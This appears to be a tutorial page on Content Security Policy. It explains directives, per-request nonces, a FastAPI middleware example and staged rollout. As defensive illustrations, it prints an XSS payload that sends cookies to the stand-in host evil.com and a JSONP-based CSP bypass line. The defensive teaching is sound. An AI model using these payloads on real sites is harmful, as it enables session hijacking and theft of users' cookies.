---
id: SEC-031
title: "Content Security Policy (CSP)"
category: "Security"
tier: tier-2-networking-security
folder: SEC-security
difficulty: ★★☆
depends_on: SEC-012, SEC-017, SEC-019, SEC-020, SEC-030
used_by: SEC-088, SEC-108
related: SEC-012, SEC-017, SEC-019, SEC-020, SEC-030, SEC-088, SEC-108
tags:
  - security
  - csp
  - xss
  - security-headers
  - content-security-policy
status: complete
version: 4
layout: default
parent: "Security"
grand_parent: "Technical Mastery"
nav_order: 31
permalink: /technical-mastery/sec/content-security-policy-csp/
---

⚡ TL;DR - Content Security Policy (CSP) is an HTTP response
header that tells browsers which sources are allowed to load
content (scripts, styles, images, fonts, etc.) on a page.
CSP is the primary browser-enforced defense against XSS.

**The core protection:** Without CSP, an XSS payload
(`<script>steal(document.cookie)</script>`) executes in
the victim's browser because the browser trusts all inline
scripts. With a strong CSP: the browser refuses to execute
inline scripts unless they match a specific nonce (cryptographic
value) included in the CSP header. XSS still injects the
script, but the browser won't execute it.

**Common weak configurations:**
- `unsafe-inline`: allows ALL inline scripts - defeats XSS protection.
- Overly broad allowlist (e.g., `*.googleapis.com`): if any
  allowed domain is compromised, it can serve XSS payloads.
- `unsafe-eval`: allows eval() - common source of DOM XSS.

**Strong CSP uses nonces:** Each page load gets a unique random
nonce. Legitimate inline scripts include `nonce="abc123"`. The
CSP header includes `script-src 'nonce-abc123'`. Injected scripts
from XSS don't have the nonce → browser blocks execution.

---

| #031 | Category: Security | Difficulty: ★★☆ |
|:---|:---|:---|
| **Depends on:** | XSS, Input Validation vs Output Encoding, Security Headers, SOP, CORS | |
| **Used by:** | Advanced XSS, CORS Misconfiguration | |
| **Related:** | XSS, Security Headers (HTTP), Same-Origin Policy, CORS | |

---

### 🔥 The Problem This Solves

**OUTPUT ENCODING IS NECESSARY BUT NOT SUFFICIENT:**
Output encoding prevents most XSS. But in large codebases:
one missed encoding point enables XSS. One vulnerable
third-party library. One prototype pollution gadget chain.
One DOM sink that receives user input without encoding.
XSS prevention via encoding is "must get every single case
right." CSP provides a second layer: even if an attacker
injects a script, the browser won't execute it without
the nonce.

**WHAT CSP ADDS:**
Defense in depth for XSS. You still need output encoding
(CSP doesn't prevent XSS from happening). But if XSS
occurs: CSP prevents script execution. The browser enforces
the policy before running any script, regardless of where
the script came from. This converts XSS from "attacker
can execute arbitrary JavaScript" to "attacker can inject
HTML but cannot execute scripts."

---

### 📘 Textbook Definition

**Content Security Policy (CSP):** An HTTP response header
(`Content-Security-Policy`) or `<meta>` tag that defines
a set of directives specifying approved sources for content
types. Browsers enforce these restrictions, blocking content
from unauthorized sources.

**Key Directives:**

**`default-src`:** Fallback for all content types not
explicitly configured. Sets the base policy.

**`script-src`:** Controls JavaScript sources. Most important
directive for XSS protection.

**`style-src`:** CSS sources.

**`img-src`:** Image sources.

**`connect-src`:** XMLHttpRequest, Fetch, WebSocket targets.

**`frame-src`:** Sources allowed in `<iframe>`.

**`font-src`:** Font sources.

**`object-src`:** Plugin content (Flash, etc.). Should be `'none'`.

**`form-action`:** Where forms can submit to.

**`base-uri`:** Restricts `<base>` tag usage.

**`upgrade-insecure-requests`:** Upgrades HTTP sub-resources to HTTPS.

**Source Values:**

**`'self'`:** Same origin as the page.

**`'none'`:** Nothing allowed (block all).

**`'unsafe-inline'`:** Allows inline scripts/styles. WEAKENS security.

**`'unsafe-eval'`:** Allows eval(). WEAKENS security.

**`'nonce-RANDOM_VALUE'`:** Allows scripts with matching
nonce attribute. Strong XSS mitigation.

**`'strict-dynamic'`:** Extends nonce trust to scripts loaded
by trusted scripts. Works with nonces.

**`https:`:** Allow any HTTPS source.

**`data:`:** Allow data: URIs (avoid for scripts).

**Report-Only Mode:**
`Content-Security-Policy-Report-Only`: Browser enforces
nothing but sends violation reports to the report-uri.
Use during development and rollout to find violations
before blocking.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
CSP tells the browser: "only run scripts from these sources."
An XSS payload doesn't have permission → browser refuses
to run it. CSP is the browser-enforced layer that limits
XSS impact even when injection occurs.

**One analogy:**
> CSP is like a building's visitor badge system. Without
> badges: anyone who walks in can access anywhere. With
> badges: only people with today's specific badge can
> access restricted areas. An attacker who sneaks in (XSS
> injection) doesn't have a badge. Security stops them at
> the door to the server room (script execution). You still
> need to keep intruders out (prevent XSS). But if one
> gets in: the badge system (CSP nonce) stops them from
> causing full damage. `unsafe-inline` = "skip the badge
> system for everyone in the building."

---

### 🔩 First Principles Explanation

**Why nonces are the strongest CSP approach:**

```
XSS ATTACK WITHOUT CSP:

  1. Attacker injects into comment field:
     <script>document.location='https://evil.com?c='+document.cookie</script>
  
  2. Comment rendered to page (output not encoded):
     <div class="comment">
       <script>document.location='...'</script>  ← attacker's script
     </div>
  
  3. Browser: "There's a script. I'll run it."
     → Cookies sent to evil.com. Session hijacked.

XSS ATTACK WITH UNSAFE-INLINE CSP:
  CSP: script-src 'self' 'unsafe-inline'
  
  Same result. 'unsafe-inline' allows ALL inline scripts.
  The attacker's injected script has implicit permission.
  'unsafe-inline' defeats XSS protection entirely.

XSS ATTACK WITH NONCE-BASED CSP:
  Server generates random nonce on each page load:
  nonce = "8IBTHwOdqNKAWeKl7plt8g=="
  
  CSP header sent with response:
  Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
                            'strict-dynamic'
  
  Legitimate script tags (added by developer):
  <script nonce="8IBTHwOdqNKAWeKl7plt8g==">
    // Application code - has nonce, browser executes
    initApp();
  </script>
  
  Attacker's injected script (via XSS):
  <script>document.location='...'</script>
  ↑ No nonce attribute.
  
  Browser: "This script has no nonce matching the CSP.
    Policy says only nonce-8IBTHwOdqNKAWeKl7plt8g== is allowed.
    BLOCKED."
  
  Result: XSS injection occurred (still need to fix encoding).
    But script execution was BLOCKED by browser.
    Attacker injected the script but cannot execute it.
  
  STRENGTH: Nonce changes on EVERY page load.
    Even if attacker reads the current nonce: it's
    single-use (new nonce per request). They cannot
    pre-compute the next nonce.
  
  REQUIREMENT FOR NONCE-BASED CSP:
    Server must dynamically generate nonce and inject
    it into BOTH the CSP header and the script tags.
    This requires server-side rendering or a templating
    system that supports nonce injection.
    Fully static pages cannot use nonces.
    CSP headers must NOT be cached (Vary: Cookie or
    Cache-Control: no-cache for pages with nonces).
```

---

### 🧪 Thought Experiment

**SCENARIO: Incrementally deploying CSP in a legacy app**

```
LEGACY APP:
  - Inline scripts everywhere (onclick="...", script blocks)
  - Third-party scripts from many CDNs
  - No output encoding in several templates
  Goal: Achieve CSP without breaking anything

PHASE 1: Report-Only Mode (Week 1-2)
  Header: Content-Security-Policy-Report-Only: 
    default-src 'self'; 
    script-src 'self'; 
    report-uri /csp-violations
  
  Result: No blocking. All violations logged to /csp-violations.
  Review reports: 200+ violations from inline scripts,
  Google Analytics, Stripe, CDN fonts.
  
  This tells you: what you need to allow before blocking.

PHASE 2: Add legitimate sources (Week 3-4)
  CSP-Report-Only: 
    default-src 'self';
    script-src 'self' https://analytics.google.com 
               https://js.stripe.com;
    style-src 'self' https://fonts.googleapis.com;
    font-src https://fonts.gstatic.com;
    img-src 'self' data: https://cdn.example.com;
    report-uri /csp-violations
  
  Review remaining violations.
  Most should be: inline scripts (onclick, script blocks).

PHASE 3: Replace inline scripts with nonces (Week 5-8)
  - Remove all onclick="..." → use addEventListener
  - Replace <script> blocks with <script nonce="...">
  - Generate nonce in template engine
  - Add 'nonce-{NONCE}' to script-src
  - Test everything.

PHASE 4: Switch from Report-Only to Enforcement (Week 9)
  Content-Security-Policy: [full policy]
  Monitor violations. Fix any remaining issues.
  Enjoy: XSS attempts now blocked by browser.

LESSON: CSP rollout in legacy apps takes weeks/months.
  Report-Only mode is essential. Don't skip it.
  CSP violations in production → real problems to fix.
```

---

### 🧠 Mental Model / Analogy

> CSP is an allowlist for browser behavior on your page.
> Historically, browsers had a denylist mindset: block
> known bad things (X-XSS-Protection header, now deprecated).
> Denylist fails because attackers find unknown patterns.
> CSP inverts to allowlist: only these specific sources
> are permitted. Unknown sources (including attacker's
> injected scripts) are denied by default. This is why
> CSP with `unsafe-inline` completely defeats the model:
> `unsafe-inline` adds "any inline code" to the allowlist,
> making the allowlist encompass attacker-controlled content.

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
CSP is a website saying "my page is only allowed to run
scripts from these specific trusted places." If a hacker
injects a script, the browser checks: "is this script
from an approved source?" If no: the browser refuses
to run it, even if it was injected into the page. This
is a safety net that limits how much damage XSS can do.

**Level 2 - How to use it (junior developer):**
Start with Report-Only mode to understand your violations
before blocking anything. Generate a random nonce per page
load in your template engine. Add `nonce="..."` to your
legitimate `<script>` tags. Set CSP header to include
`script-src 'nonce-{nonce}' 'strict-dynamic'; object-src 'none'`.
Use securityheaders.com to evaluate your CSP. Avoid
`'unsafe-inline'` and `'unsafe-eval'` - they defeat XSS protection.

**Level 3 - How it works (mid-level engineer):**
`'strict-dynamic'`: scripts loaded by trusted nonce-bearing scripts
inherit trust. This allows: `<script nonce="abc">` loading other
scripts (e.g., dynamic imports) without needing to whitelist
those URLs. The loaded scripts are considered trusted because
the trusted script loaded them. This simplifies CSP in complex
SPA scenarios where scripts dynamically load other scripts.
Without `strict-dynamic`: you must allowlist every script URL
(brittle, breaks when CDN changes URLs). CSP Level 3 added
`strict-dynamic` specifically for this problem.

**Level 4 - Why it was designed this way (senior/staff):**
CSP was designed as a graduated response to the XSS problem.
Level 1 (2010): basic allowlists. Level 2 (2015): nonces and
hashes. Level 3 (2016+): `strict-dynamic`, `unsafe-hashes`.
The nonce mechanism was a significant security improvement:
instead of allowlisting script URLs (which can be subverted
if any allowlisted domain is compromised), you allowlist
specific script executions. Each nonce is single-page-load-unique,
so even if an attacker reads the current nonce from the page
source (same origin reads allowed), they can't use it for
future injections. The limitation: CSP is browser-enforced,
but not all browsers enforce all directives consistently.
Always check caniuse.com for directive support.

**Level 5 - Mastery (distinguished engineer):**
Trusted Types API (Chrome, supported by CSP `require-trusted-types-for 'script'`):
prevents DOM XSS by requiring all potentially dangerous DOM sinks
(innerHTML, eval, document.write) to receive only Trusted Type
objects, not raw strings. This is a more surgical control than
CSP: it doesn't prevent script execution but prevents dangerous
string injection into DOM sinks. Combining: CSP with nonces
(prevents inline XSS script execution) + Trusted Types (prevents
DOM XSS) + output encoding (prevents injection in the first place)
= defense in depth for XSS at three separate layers. The
remaining attack surface: injecting content into `<a href=...>`
(navigation XSS), `<base>` hijacking, JSONP endpoints on allowlisted
domains. CSP `navigate-to` directive (Level 3) restricts navigation.
`base-uri 'self'` prevents base hijacking.

---

### ⚙️ How It Works (Mechanism)

**CSP enforcement flow in browser:**

```
PAGE LOAD WITH CSP:

  Server responds with:
    HTTP/1.1 200 OK
    Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic';
                              object-src 'none';
                              base-uri 'self';
                              form-action 'self'
    [HTML body]

  HTML body includes:
    <script nonce="abc123">      ← Legitimate script (has nonce)
      initializeApp();
    </script>
    
    <script>                      ← Injected XSS (no nonce)
      stealCookies();
    </script>

  BROWSER ENFORCEMENT:
    1. Parse CSP header. Store policy.
    2. Encounter first <script nonce="abc123">:
       Check: is "abc123" in CSP nonce list? YES → Execute.
    3. Encounter second <script> (no nonce):
       Check: nonce required? No nonce present.
       Action: BLOCK execution.
       Console: "Refused to execute inline script because
                it violates Content Security Policy directive
                'script-src nonce-abc123'..."
    4. If report-uri configured: send violation report.

NONCE GENERATION (CRITICAL):
  Nonce must be:
    - Cryptographically random (not predictable)
    - At least 128 bits (16 bytes)
    - Different on EVERY page load (not cached)
    - Base64 encoded for header inclusion
  
  Python:
    import secrets
    nonce = secrets.token_urlsafe(16)  # 128 bits, URL-safe base64
  
  Template:
    <script nonce="{{ nonce }}">...</script>
  
  Header:
    f"Content-Security-Policy: script-src 'nonce-{nonce}'"
  
  NEVER: static nonce, nonce derived from session ID,
    nonce included in cached responses
```

---

### 💻 Code Example

**Implementing CSP with nonces in a Python web application:**

```python
# CSP middleware with nonce generation
# Works with Flask/FastAPI templates

import secrets
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def generate_nonce() -> str:
    """Generate a cryptographically secure 128-bit nonce."""
    return secrets.token_urlsafe(16)  # URL-safe base64 (no padding)

def build_csp_header(nonce: str) -> str:
    """Build Content-Security-Policy header with nonce."""
    return (
        f"script-src 'nonce-{nonce}' 'strict-dynamic' https:; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "upgrade-insecure-requests"
    )

@app.middleware("http")
async def csp_middleware(request: Request, call_next):
    # Generate per-request nonce
    nonce = generate_nonce()
    
    # Store in request state for templates to use
    request.state.csp_nonce = nonce
    
    response = await call_next(request)
    
    # Add CSP header to response
    if "text/html" in response.headers.get("content-type", ""):
        response.headers["Content-Security-Policy"] = (
            build_csp_header(nonce)
        )
        # Ensure no caching of CSP-bearing pages
        response.headers["Cache-Control"] = "no-store"
    
    return response

@app.get("/", response_class=HTMLResponse)
async def homepage(request: Request):
    return templates.TemplateResponse(
        "index.html",
        {
            "request": request,
            "nonce": request.state.csp_nonce
        }
    )

# Template: templates/index.html
# <!-- CORRECT: nonce on all script tags -->
# <script nonce="{{ nonce }}">
#     // Application JavaScript
#     document.getElementById('app').addEventListener(
#       'click', handleClick
#     );
# </script>
#
# <!-- WRONG: inline event handler (no nonce possible) -->
# <button onclick="handleClick()">Click</button>
# ↑ Must be replaced with addEventListener in script block
#
# <!-- WRONG: unsafe-inline in CSP -->
# script-src 'self' 'unsafe-inline'
# ↑ Allows ALL inline scripts including XSS payloads

# TESTING CSP VIOLATIONS:
# 1. Use CSP Evaluator: csp-evaluator.withgoogle.com
# 2. securityheaders.com: rates your overall security headers
# 3. Report-Only mode with report-uri → log violations in staging
# 4. Browser console: violations shown with specific directive
```

---

### ⚖️ Comparison Table

| CSP Approach | XSS Protection | Difficulty | Notes |
|:---|:---|:---|:---|
| **No CSP** | None (browser runs everything) | None | Zero defense |
| **Allowlist only** | Weak (bypass via trusted domains) | Medium | JSONP, Angular templates bypass |
| **`unsafe-inline`** | None (attacker inline scripts allowed) | Low | Defeats entire purpose |
| **Nonce-based** | Strong (inline XSS blocked) | High (requires server-side nonce) | Best practice for SSR apps |
| **Nonce + `strict-dynamic`** | Strong + flexible | High | Best for modern SPAs |
| **Hashes** | Strong for static scripts | Medium | `sha256-...`, good for static pages |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|:---|:---|
| CSP prevents XSS | CSP mitigates XSS impact but does NOT prevent XSS injection. An attacker can still inject malicious HTML (e.g., `<script>` tags). What CSP prevents is EXECUTION of those injected scripts (when configured with nonces). The XSS vulnerability still exists and still needs to be fixed via output encoding. CSP is the second layer: if injection occurs, limit what the injected code can do. You still need proper output encoding as the first layer. |
| CSP with `unsafe-inline` protects against XSS | CSP with `unsafe-inline` in `script-src` provides zero protection against inline XSS. The browser sees `<script>` from any source and treats it as allowed (because `unsafe-inline` is in the allowlist). An attacker who injects `<script>stealCookies()</script>` gets it executed. The CSP header with `unsafe-inline` gives a false sense of security. Removing `unsafe-inline` from `script-src` is a prerequisite for meaningful XSS protection via CSP. |

---

### 🚨 Failure Modes & Diagnosis

**Common CSP deployment failures:**

```
FAILURE 1: Nonce not regenerated per request
  Bug: nonce = "STATIC_VALUE" (hardcoded or set at startup)
  
  Consequence: attacker reads the nonce from page source
    (same-origin reads allowed), injects:
    <script nonce="STATIC_VALUE">stealCookies()</script>
    Browser executes: nonce matches!
  
  Fix: generate cryptographically random nonce on every request.
  Test: check two sequential page loads have different nonces.

FAILURE 2: CSP nonce page cached by CDN
  Bug: CDN caches the HTML response including CSP header.
    Different users get the same nonce.
    Attacker can predict/extract nonce.
  
  Fix: Add Cache-Control: no-store for HTML pages.
    Or: use hash-based CSP for static content
    (hash doesn't change, caching is fine).
    Set Vary: Cookie to prevent CDN caching of
    personalized/authenticated pages.

FAILURE 3: 'unsafe-eval' in script-src
  Common cause: JavaScript bundler error (webpack),
    old library using eval(), or Angular template compiler.
  
  Consequence: eval() is allowed → many DOM XSS payloads
    use eval or Function() constructor.
  
  Fix: Identify what needs eval() (fix the library or config).
    For Angular: use Ahead-of-Time (AOT) compilation.
    For webpack: report violations to find source.

FAILURE 4: Overly permissive script-src allowlist
  Bug: script-src 'self' https://www.google.com *.googleapis.com
  
  Bypass: JSONP endpoints on googleapis.com:
    <script src="https://maps.googleapis.com/maps/api/js?callback=stealCookies">
    This loads the attacker's function via a JSONP endpoint!
    Trusted domain serves attacker's payload.
  
  Fix: Nonces instead of URL allowlists. Or: validate
    that allowed domains have no JSONP endpoints.

DIAGNOSING VIOLATIONS:
  Browser console shows: what was blocked and which directive.
  Report-Only mode + report-uri: collects all violations.
  Review: are violations from legitimate app code or from attacks?
  Legitimate: add appropriate nonce/source to CSP.
  Attack: no action needed in CSP (it's already blocked).
```

---

### 🔗 Related Keywords

**Prerequisites:**
- `Cross-Site Scripting (XSS)` - what CSP mitigates
- `Input Validation vs Output Encoding` - first line of XSS defense
- `Security Headers (HTTP)` - CSP is a security header

**Builds on this:**
- `Advanced XSS` - bypasses including CSP-bypass techniques
- `CORS Misconfiguration` - related browser security model

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ CSP HEADER   │ Content-Security-Policy: script-src ...  │
│ REPORT-ONLY  │ Content-Security-Policy-Report-Only: ... │
│              │ (test before enforcing)                  │
├──────────────┼───────────────────────────────────────────┤
│ NONCE        │ Per-request random 128-bit value         │
│              │ In header: 'nonce-VALUE'                  │
│              │ In script: <script nonce="VALUE">         │
├──────────────┼───────────────────────────────────────────┤
│ AVOID        │ 'unsafe-inline': defeats XSS protection  │
│              │ 'unsafe-eval': allows dangerous eval()   │
│              │ * wildcard: overly permissive            │
├──────────────┼───────────────────────────────────────────┤
│ STRONG CSP   │ script-src 'nonce-{N}' 'strict-dynamic'; │
│              │ object-src 'none'; base-uri 'self'       │
├──────────────┼───────────────────────────────────────────┤
│ TOOLS        │ csp-evaluator.withgoogle.com             │
│              │ securityheaders.com                      │
│              │ Browser DevTools console                 │
└──────────────────────────────────────────────────────────┘
```

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
"Defense in depth: each layer assumes the previous layer
can fail." Output encoding is the primary XSS defense -
it should prevent injection. CSP is the secondary defense -
it limits damage when injection occurs. This layering
principle applies broadly: input validation + parameterized
queries (SQL injection), HTTPS + HSTS (transport security),
authentication + authorization (access control). No single
control is assumed infallible. Layers mean a single failure
doesn't equal full compromise. When choosing security
controls: ask "what does this layer protect against,
and what does it assume worked correctly in a previous layer?"

---

### 💡 The Surprising Truth

CSP's biggest adoption barrier is not technical - it's
legacy code. A strict CSP (no `unsafe-inline`) requires
removing ALL inline JavaScript from an application: every
`onclick="..."` attribute, every `<script>` tag without
a nonce, every `href="javascript:..."`. In a codebase
with years of development and dozens of developers:
finding and removing all inline JavaScript can take months.
This is why Report-Only mode is essential: it shows you
exactly what needs to change before you start breaking
the application. Organizations that adopt CSP from the
beginning of a project experience no significant overhead.
Organizations that try to add CSP to an established codebase
discover that the real cost is refactoring years of technical
security debt. The lesson: security decisions made early
in a project have compounding value; decisions deferred
to "later" compound in cost.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**
1. **GENERATE** a nonce-based CSP header, explain why the
   nonce must be random and per-request, and show how it
   blocks XSS even when injection occurs.
2. **IDENTIFY** why `unsafe-inline` completely defeats CSP's
   XSS protection and what must replace it.
3. **DEPLOY** CSP incrementally: start with Report-Only mode,
   review violations, tighten the policy, then switch to
   enforcement mode.
4. **EXPLAIN** why CSP mitigates XSS impact but doesn't
   eliminate the XSS vulnerability - both layers are needed.

---

### 🎯 Interview Deep-Dive

**Q: How does Content Security Policy protect against XSS?
What are its limitations?**

*Why they ask:* CSP is the most important browser security
mechanism. Tests depth of XSS defense knowledge.

*Strong answer includes:*
- CSP mechanism: HTTP header declaring allowed script sources.
  Browser enforces before executing any script. Injected scripts
  from XSS must have a matching nonce or come from an allowed source.
  Without the nonce: browser blocks execution even if the script
  is present in the DOM.
- Nonce-based CSP: per-request random nonce in both the CSP header
  and legitimate `<script nonce="...">` tags. XSS injects `<script>`
  without the nonce → blocked. Nonce must be cryptographically
  random, unique per request, not cached.
- `unsafe-inline` immediately defeats this: allows ALL inline scripts
  including XSS payloads. The word "unsafe" in the name is intentional.
- Limitations: (a) CSP doesn't prevent XSS injection, only execution.
  Output encoding is still the primary defense. (b) Misconfiguration
  (unsafe-inline, overly broad allowlists, JSONP endpoints on allowed
  domains) negates the protection. (c) DOM-based XSS using native
  browser APIs (without script tags) may not be caught by CSP alone.
  (d) CSP-bypass via trusted domains with JSONP endpoints.
- Trusted Types complements CSP: prevents DOM sink injection.
- Deployment: always start with Report-Only mode in production
  to discover violations before breaking the application.